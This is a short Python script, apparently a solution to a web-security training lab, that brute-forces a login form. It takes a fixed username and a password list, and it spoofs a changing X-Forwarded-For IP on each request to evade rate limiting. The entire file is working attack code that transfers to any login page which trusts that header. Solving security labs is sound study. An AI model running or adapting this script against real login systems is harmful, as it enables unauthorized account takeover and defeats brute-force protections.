import requests as req 

url = "https://0a8500bc046e976ec1281745007500af.web-security-academy.net/login"

# Username discovered from the previous script
user = "azureuser"

pass_file = open("../passwords")
ctr = 0
while password := pass_file.readline().strip():
    d = (ctr % 256)
    c = (ctr // 256) % 256
    b = ((ctr // 256) // 256) % 256
    a = (((ctr // 256) // 256) // 256) % 256
    ctr+=1
    header = {"X-Forwarded-For" : f"{a}.{b}.{c}.{d}"}
    dat = {"username":user,"password":password}
    x = req.post(url, dat, headers=header)
    if "Invalid username or password" not in x.text: 
        print(f"Username: {user} Password: {password}")
    